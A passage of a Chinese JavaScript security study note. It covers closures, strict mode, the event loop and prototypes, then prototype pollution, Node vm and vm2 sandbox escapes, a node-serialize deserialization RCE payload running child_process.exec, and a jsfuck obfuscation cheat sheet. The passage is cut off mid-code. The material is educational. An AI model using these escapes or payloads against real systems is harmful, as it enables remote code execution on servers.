data-num=\"7\"></td><td><pre>    <span class=\"token function-variable function\">increment</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>      <span class=\"token function\">changeBy</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function-variable function\">decrement</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token function\">changeBy</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function-variable function\">value</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token keyword\">return</span> privateCounter<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>Counter<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* logs 0 */</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Counter<span class=\"token punctuation\">.</span><span class=\"token function\">increment</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>Counter<span class=\"token punctuation\">.</span><span class=\"token function\">increment</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>Counter<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* logs 2 */</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>Counter<span class=\"token punctuation\">.</span><span class=\"token function\">decrement</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>Counter<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* logs 1 */</span></pre></td></tr></table></figure><h2 id=\"全局对象\"><a class=\"anchor\" href=\"#全局对象\">#</a> 全局对象</h2>\n<p>全局对象是一个特殊的对象，它的作用域是全局的。</p>\n<p>全平台可用的全局对象是  <code>globalThis</code>  ，它跟全局作用域里的 this 值相同。另外在浏览器中存在  <code>self</code>  和  <code>window</code>  全局对象，Web Workers 中存在  <code>self</code>  全局对象，Node.js 中存在  <code>global</code>  全局对象。</p>\n<h1 id=\"严格模式\"><a class=\"anchor\" href=\"#严格模式\">#</a> 严格模式</h1>\n<h2 id=\"简介-3\"><a class=\"anchor\" href=\"#简介-3\">#</a> 简介</h2>\n<p>在 ES5 中，除了正常的运行模式之外，添加了严格模式（strict mode），这种模式使得代码显式地脱离 “马虎模式 / 稀松模式 / 懒散模式 “（sloppy）模式在更严格的条件下运行。严格模式不仅仅是一个子集：它的产生是为了形成与正常代码不同的语义。</p>\n<p>引入严格模式的目的主要是：</p>\n<ul>\n<li>通过抛出错误来消除了一些原有静默错误</li>\n<li>消除 JavaScript 语法的一些不合理、不严谨之处，减少一些怪异行为</li>\n<li>消除代码运行的一些不安全之处，保证代码运行的安全</li>\n<li>修复了一些导致 JavaScript 引擎难以执行优化的缺陷，提高编译器效率，增加运行速度</li>\n<li>禁用了在 ECMAScript 的未来版本中可能会定义的一些语法，为未来新版本的 JavaScript 做铺垫</li>\n</ul>\n<h2 id=\"调用\"><a class=\"anchor\" href=\"#调用\">#</a> 调用</h2>\n<p>严格模式使用  <code>&quot;use strict&quot;;</code>  字符串开启。对整个脚本文件而言，可以将  <code>&quot;use strict&quot;</code>  放在脚本文件的第一行使整个脚本以严格模式运行。如果这行语句不在第一行则不会生效，会以正常模式运行。</p>\n<p>对单个函数而言，将  <code>&quot;use strict&quot;</code>  放在函数体的第一行，则整个函数以严格模式运行。</p>\n<h2 id=\"行为改变\"><a class=\"anchor\" href=\"#行为改变\">#</a> 行为改变</h2>\n<p>在严格模式中，主要有以下的行为更改：</p>\n<h3 id=\"全局变量显式声明\"><a class=\"anchor\" href=\"#全局变量显式声明\">#</a> 全局变量显式声明</h3>\n<p>在正常模式中，如果一个变量没有声明就赋值，默认是全局变量。严格模式禁止这种用法，全局变量必须显式声明。</p>\n<pre><code class=\"language-JavaScript\">&quot;use strict&quot;;\nfor(i = 0; i &lt; 2; i++) &#123; // ReferenceError: i is not defined\n&#125;\n</code></pre>\n<h3 id=\"禁止使用with语句\"><a class=\"anchor\" href=\"#禁止使用with语句\">#</a> 禁止使用 with 语句</h3>\n<p>with 语句无法在编译时就确定，属性到底归属哪个对象，这会影响编译效率，所以在严格模式中被禁止。</p>\n<h3 id=\"创设eval作用域\"><a class=\"anchor\" href=\"#创设eval作用域\">#</a> 创设 eval 作用域</h3>\n<p>正常模式下，eval 语句的作用域，取决于它处于全局作用域，还是处于函数作用域。严格模式下，eval 语句本身就是一个作用域，不再能够生成全局变量了，它所生成的变量只能用于 eval 内部。</p>\n<h3 id=\"禁止删除变量\"><a class=\"anchor\" href=\"#禁止删除变量\">#</a> 禁止删除变量</h3>\n<p>严格模式下无法删除变量。只有 configurable 设置为 true 的对象属性，才能被删除。</p>\n<h3 id=\"显式报错\"><a class=\"anchor\" href=\"#显式报错\">#</a> 显式报错</h3>\n<p>正常模式下一些错误只会默默地失败，但是严格模式下将会报错，包括以下几种场景：</p>\n<ul>\n<li>对一个对象的只读属性进行赋值</li>\n<li>对一个使用 getter 方法读取的属性进行赋值</li>\n<li>对禁止扩展的对象添加新属性</li>\n<li>删除一个不可删除的属性</li>\n</ul>\n<h3 id=\"语法错误\"><a class=\"anchor\" href=\"#语法错误\">#</a> 语法错误</h3>\n<p>严格模式新增了一些语法错误，包括：</p>\n<ul>\n<li>对象不能有重名的属性</li>\n<li>函数不能有重名的参数</li>\n<li>禁止八进制表示法</li>\n<li>函数必须声明在顶层</li>\n<li>新增保留字\n<ul>\n<li>class</li>\n<li>enum</li>\n<li>export</li>\n<li>extends</li>\n<li>import</li>\n<li>super</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"安全增强\"><a class=\"anchor\" href=\"#安全增强\">#</a> 安全增强</h3>\n<ul>\n<li>禁止 this 关键字指向全局对象</li>\n<li>禁止在函数内部遍历调用栈</li>\n</ul>\n<h3 id=\"限制arguments对象\"><a class=\"anchor\" href=\"#限制arguments对象\">#</a> 限制 arguments 对象</h3>\n<ul>\n<li>不允许对 arguments 赋值</li>\n<li>arguments 不再追踪参数的变化</li>\n<li>禁止使用 arguments.callee</li>\n</ul>\n<h1 id=\"异步机制\"><a class=\"anchor\" href=\"#异步机制\">#</a> 异步机制</h1>\n<h2 id=\"async-await\"><a class=\"anchor\" href=\"#async-await\">#</a> async / await</h2>\n<p>async function 关键字用来在表达式中定义异步函数。</p>\n<h2 id=\"promise\"><a class=\"anchor\" href=\"#promise\">#</a> Promise</h2>\n<p>Promise 对象是一个代理对象（代理一个值），被代理的值在 Promise 对象创建时可能是未知的。它允许你为异步操作的成功和失败分别绑定相应的处理方法（handlers）。 这让异步方法可以像同步方法那样返回值，但并不是立即返回最终执行结果，而是一个能代表未来出现的结果的 promise 对象</p>\n<p>一个 Promise 有以下几种状态:</p>\n<ul>\n<li>pending: 初始状态，既不是成功，也不是失败状态。</li>\n<li>fulfilled: 意味着操作成功完成。</li>\n<li>rejected: 意味着操作失败。</li>\n</ul>\n<p>pending 状态的 Promise 对象可能会变为 fulfilled 状态并传递一个值给相应的状态处理方法，也可能变为失败状态（rejected）并传递失败信息。当其中任一种情况出现时，Promise 对象的 then 方法绑定的处理方法（handlers ）就会被调用（then 方法包含两个参数：onfulfilled 和 onrejected，它们都是 Function 类型。当 Promise 状态为 fulfilled 时，调用 then 的 onfulfilled 方法，当 Promise 状态为 rejected 时，调用 then 的 onrejected 方法， 所以在异步操作的完成和绑定处理方法之间不存在竞争）。</p>\n<p>因为 Promise.prototype.then 和 Promise.prototype.catch 方法返回 promise 对象， 所以它们可以被链式调用。</p>\n<h2 id=\"执行队列\"><a class=\"anchor\" href=\"#执行队列\">#</a> 执行队列</h2>\n<p>JavaScript 中的异步运行机制如下：</p>\n<ul>\n<li>所有同步任务都在主线程上执行，形成一个执行栈</li>\n<li>主线程之外，还存在一个任务队列。只要异步任务有了运行结果，就在任务队列之中放置一个事件。</li>\n<li>一旦执行栈中的所有同步任务执行完毕，系统就会读取任务队列，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。</li>\n<li>主线程不断重复上面的第三步。</li>\n</ul>\n<p>其中浏览器的内核是多线程的，在浏览器的内核中不同的异步操作由不同的浏览器内核模块调度执行，异步操作会将相关回调添加到任务队列中。可以分为 DOM 事件、时间回调、网络回调三种：</p>\n<ul>\n<li>DOM 事件：由浏览器内核的 DOM 模块来处理，当事件触发的时候，回调函数会被添加到任务队列中。</li>\n<li>时间回调：setTimeout /setInterval 等函数会由浏览器内核的 timer 模块来进行延时处理，当时间到达的时候，将回调函数添加到任务队列中。</li>\n<li>网络回调：ajax /fetch 等则由浏览器内核的 network 模块来处理，在网络请求完成返回之后，才将回调添加到任务队列中。</li>\n</ul>\n<h1 id=\"原型链\"><a class=\"anchor\" href=\"#原型链\">#</a> 原型链</h1>\n<h2 id=\"显式原型和隐式原型\"><a class=\"anchor\" href=\"#显式原型和隐式原型\">#</a> 显式原型和隐式原型</h2>\n<p>JavaScript 的原型分为显式原型（explicit prototype property）和隐式原型（implicit prototype link）。</p>\n<p>其中显式原型指 prototype，是函数的一个属性，这个属性是一个指针，指向一个对象，显示修改对象的原型的属性，只有函数才有该属性</p>\n<p>隐式原型指 JavaScript 中任意对象都有的内置属性 prototype。在 ES5 之前没有标准的方法访问这个内置属性，但是大多数浏览器都支持通过  <code>__proto__</code>  来访问。ES5 中有了对于这个内置属性标准的 Get 方法  <code>Object.getPrototypeOf()</code>  。</p>\n<p>隐式原型指向创建这个对象的函数 (constructor) 的 prototype，  <code>__proto__</code>  指向的是当前对象的原型对象，而 prototype 指向的，是以当前函数作为构造函数构造出来的对象的原型对象。</p>\n<p>显式原型的作用用来实现基于原型的继承与属性的共享。 隐式原型的用于构成原型链，同样用于实现基于原型的继承。举个例子，当我们访问 obj 这个对象中的 x 属性时，如果在 obj 中找不到，那么就会沿着  <code>__proto__</code>  依次查找。</p>\n<pre><code>Note: Object.prototype 这个对象是个例外，它的__proto__值为null\n</code></pre>\n<h2 id=\"new-的过程\"><a class=\"anchor\" href=\"#new-的过程\">#</a> new 的过程</h2>\n<pre><code class=\"language-JavaScript\">var Person = function()&#123;&#125;;\nvar p = new Person();\n</code></pre>\n<p>new 的过程拆分成以下三步： -  <code>var p=&#123;&#125;;</code>  初始化一个对象 p -  <code>p.__proto__ = Person.prototype;</code>  -  <code>Person.call(p);</code>  构造 p，也可以称之为初始化 p</p>\n<p>关键在于第二步，我们来证明一下：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> <span class=\"token function-variable function\">Person</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">var</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>__proto__ <span class=\"token operator\">===</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这段代码会返回 true。说明我们步骤 2 是正确的。</p>\n<h2 id=\"示例\"><a class=\"anchor\" href=\"#示例\">#</a> 示例</h2>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> <span class=\"token function-variable function\">Person</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">Person</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">sayName</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"My Name is Jacky\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token class-name\">Person</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> <span class=\"token number\">27</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">var</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">sayName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>p 是一个引用指向 Person 的对象。我们在 Person 的原型上定义了一个 sayName 方法和 age 属性，当我们执行 p.age 时，会先在 this 的内部查找（也就是构造函数内部），如果没有找到然后再沿着原型链向上追溯。</p>\n<p>这里的向上追溯是怎么向上的呢？这里就要使用  <code>__proto__</code>  属性来链接到原型（也就是 Person.prototype）进行查找。最终在原型上找到了 age 属性。</p>\n<h2 id=\"原型链污染\"><a class=\"anchor\" href=\"#原型链污染\">#</a> 原型链污染</h2>\n<p>如前文提到的，JavaScript 是动态继承，通过  <code>__proto__</code>  修改自身对象时会影响到有相同原型的对象。因此当键值对是用户可控的情况下，就可能出现原型链污染。</p>\n<h1 id=\"沙箱逃逸\"><a class=\"anchor\" href=\"#沙箱逃逸\">#</a> 沙箱逃逸</h1>\n<h2 id=\"前端沙箱\"><a class=\"anchor\" href=\"#前端沙箱\">#</a> 前端沙箱</h2>\n<p>在前端中，可能会使用删除  <code>eval</code>  ，重写  <code>Function.prototype.constructor</code>  /  <code>GeneratorFunction</code>  /  <code>AsyncFunction</code>  等方式来完成前端的沙箱。在这种情况下，可以使用创建一个新 iframe 的方式来获取新的执行环境。</p>\n<h2 id=\"服务端沙箱\"><a class=\"anchor\" href=\"#服务端沙箱\">#</a> 服务端沙箱</h2>\n<p>JavaScript 提供了原生的 vm 模块，用于隔离了代码上下文环境。但是在该环境中依然可以访问标准的 JavaScript API 和全局的 NodeJS 环境。</p>\n<p>在原生的沙箱模块中，常用的逃逸方式为：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">const</span> vm <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'vm'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">const</span> sandbox <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">const</span> whatIsThis <span class=\"token operator\">=</span> vm<span class=\"token punctuation\">.</span><span class=\"token function\">runInNewContext</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\"></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    const ForeignObject = this.constructor;</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    const ForeignFunction = ForeignObject.constructor;</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    const process = ForeignFunction(\"return process\")();</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    const require = process.mainModule.require;</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    require(\"fs\");</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span> sandbox<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>考虑到 JavaScript 原生 vm 模块的缺陷，有开发者设计了 vm2 来提供一个更安全的隔离环境，但是在旧版本中同样存在一些逃逸方式，例如：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>vm<span class=\"token punctuation\">.</span><span class=\"token function\">runInNewContext</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token string\">'Promise.resolve().then(()=>&#123;while(1)console.log(\"foo\", Date.now());&#125;); while(1)console.log(Date.now())'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span><span class=\"token literal-property property\">console</span><span class=\"token operator\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">.</span><span class=\"token function\">apply</span><span class=\"token punctuation\">(</span>console<span class=\"token punctuation\">,</span>arguments<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span><span class=\"token literal-property property\">timeout</span><span class=\"token operator\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"反序列化\"><a class=\"anchor\" href=\"#反序列化\">#</a> 反序列化</h1>\n<h2 id=\"简介-4\"><a class=\"anchor\" href=\"#简介-4\">#</a> 简介</h2>\n<p>JavaScript 本身并没有反序列化的实现，但是一些库如 node-serialize、serialize-to-js 等支持了反序列化功能。这些库通常使用 JSON 形式来存储数据，但是和原生函数 JSON.parse、 JSON.stringify 不同，这些库支持任何对象的反序列化，特别是函数，如果使用不当，则可能会出现反序列化问题。</p>\n<h2 id=\"payload构造\"><a class=\"anchor\" href=\"#payload构造\">#</a> Payload 构造</h2>\n<p>下面是一个最简单的例子，首先获得序列化后的输出</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> y <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token function-variable function\">rce</span> <span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child_process'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ls /'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">error<span class=\"token punctuation\">,</span> stdout<span class=\"token punctuation\">,</span> stderr</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">var</span> serialize <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'node-serialize'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Serialized: \\n\"</span> <span class=\"token operator\">+</span> serialize<span class=\"token punctuation\">.</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>上面执行后会返回</p>\n<pre><code>&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function ()&#123;require('child_process').exec('ls /', function(error, stdout, stderr) &#123; console.log(stdout) &#125;);&#125;&quot;&#125;\n</code></pre>\n<p>不过这段 payload 反序列化后并不会执行，但是在 JS 中支持立即调用的函数表达式（Immediately Invoked Function Expression），比如  <code>(function () &#123; /* code */ &#125; ());</code>  这样就会执行函数中的代码。那么可以使用这种方法修改序列化后的字符串来完成一次反序列化。最后的 payload 测试如下:</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> serialize <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'node-serialize'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">var</span> payload <span class=\"token operator\">=</span> <span class=\"token string\">'&#123;\"rce\":\"_$$ND_FUNC$$_function ()&#123;require(\\'child_process\\').exec(\\'ls /\\', function(error, stdout, stderr) &#123; console.log(stdout) &#125;);&#125;()\"&#125;'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>serialize<span class=\"token punctuation\">.</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"payload构造-ii\"><a class=\"anchor\" href=\"#payload构造-ii\">#</a> Payload 构造 II</h2>\n<p>以上提到的是 node-serialize 这类反序列化库的构造方式，还有一类库如 funcster，是使用直接拼接字符串构造函数的方式来执行。</p>\n<pre><code>return &quot;module.exports=(function(module,exports)&#123;return&#123;&quot; + entries + &quot;&#125;;&#125;)();&quot;;\n</code></pre>\n<p>这种方式可以使用相应的闭合来构造 payload。</p>\n<h1 id=\"jsfuck-cheat-sheet\"><a class=\"anchor\" href=\"#jsfuck-cheat-sheet\">#</a> jsfuck cheat sheet</h1>\n<h2 id=\"basic-values\"><a class=\"anchor\" href=\"#basic-values\">#</a> Basic values</h2>\n<ul>\n<li><code>undefined</code>  &gt;  <code>[][[]]</code></li>\n<li><code>false</code>  &gt;  <code>![]</code></li>\n<li><code>true</code>  &gt;  <code>!![]</code></li>\n<li><code>NaN</code>  &gt;  <code>+[![]]</code></li>\n<li><code>0</code>  &gt;  <code>+[]</code></li>\n<li><code>1</code>  &gt;  <code>+!+[]</code></li>\n<li><code>2</code>  &gt;  <code>!+[]+!+[]</code></li>\n</ul>\n<h2 id=\"basic-strings\"><a class=\"anchor\" href=\"#basic-strings\">#</a> Basic strings</h2>\n<ul>\n<li><code>''</code>  &gt;  <code>[]+[]</code></li>\n<li><code>'undefined'</code>  &gt;  <code>[]+[][[]]</code></li>\n<li><code>'false'</code>  &gt;  <code>[]+![]</code></li>\n<li><code>'true'</code>  &gt;  <code>[]+!![]</code></li>\n<li><code>'NaN'</code>  &gt;  <code>[]+(+[![]])</code></li>\n<li><code>'0'</code>  &gt;  <code>[]+(+[])</code></li>\n<li><code>'1'</code>  &gt;  <code>[]+(+!+[])</code></li>\n<li><code>'2'</code>  &gt;  <code>[]+(!+[]+!+[])</code></li>\n<li><code>'10'</code>  &gt;  <code>[+!+[]]+[+[]]</code></li>\n<li><code>'11'</code>  &gt;  <code>[+!+[]]+[+!+[]]</code></li>\n<li><code>'100'</code>  &gt;  <code>[+!+[]]+[+[]]+(+[])</code></li>\n</ul>\n<h2 id=\"higher-numbers\"><a class=\"anchor\" href=\"#higher-numbers\">#</a> Higher numbers</h2>\n<ul>\n<li><code>10</code>  &gt;  <code>+([+!+[]]+[+[]])</code></li>\n<li><code>11</code>  &gt;  <code>+([+!+[]]+[+!+[]])</code></li>\n<li><code>100</code>  &gt;  <code>+([+!+[]]+[+[]]+(+[]))</code></li>\n</ul>\n<h2 id=\"string-alphabet\"><a class=\"anchor\" href=\"#string-alphabet\">#</a> String alphabet</h2>\n<ul>\n<li><code>'a'</code>  &gt;  <code>([]+![])[+!+[]]</code></li>\n<li><code>'d'</code>  &gt;  <code>([]+[][[]])[+!+[]+!+[]]</code></li>\n<li><code>'e'</code>  &gt;  <code>([]+!+[])[+!+[]+!+[]+!+[]]</code></li>\n<li><code>'f'</code>  &gt;  <code>([]+![])[+[]]</code></li>\n<li><code>'i'</code>  &gt;  <code>([]+[][[]])[+!+[]+!+[]+!+[]+!+[]+!+[]]</code></li>\n<li><code>'l'</code>  &gt;  <code>([]+![])[+!+[]+!+[]]</code></li>\n<li><code>'n'</code>  &gt;  <code>([]+[][[]])[+!+[]]</code></li>\n<li><code>'r'</code>  &gt;  <code>([]+!+[])[+!+[]]</code></li>\n<li><code>'s'</code>  &gt;  <code>([]+![])[+!+[]+!+[]+!+[]]</code></li>\n<li><code>'t'</code>  &gt;  <code>([]+!+[])[+[]]</code></li>\n<li><code>'u'</code>  &gt;  <code>([]+!+[])[+!+[]+!+[]]</code></li>\n</ul>\n<h1 id=\"trick\"><a class=\"anchor\" href=\"#trick\">#</a> Trick</h1>\n<h2 id=\"通过正则表达式构造特定字符\"><a class=\"anchor\" href=\"#通过正则表达式构造特定字符\">#</a> 通过正则表达式构造特定字符</h2>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>empty <span class=\"token operator\">=</span> <span class=\"token class-name\">RegExp</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>flags</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>regSource <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token operator\">...</span><span class=\"token class-name\">RegExp</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>source <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>regSource<span class=\"token punctuation\">.</span>toString <span class=\"token operator\">=</span> <span class=\"token 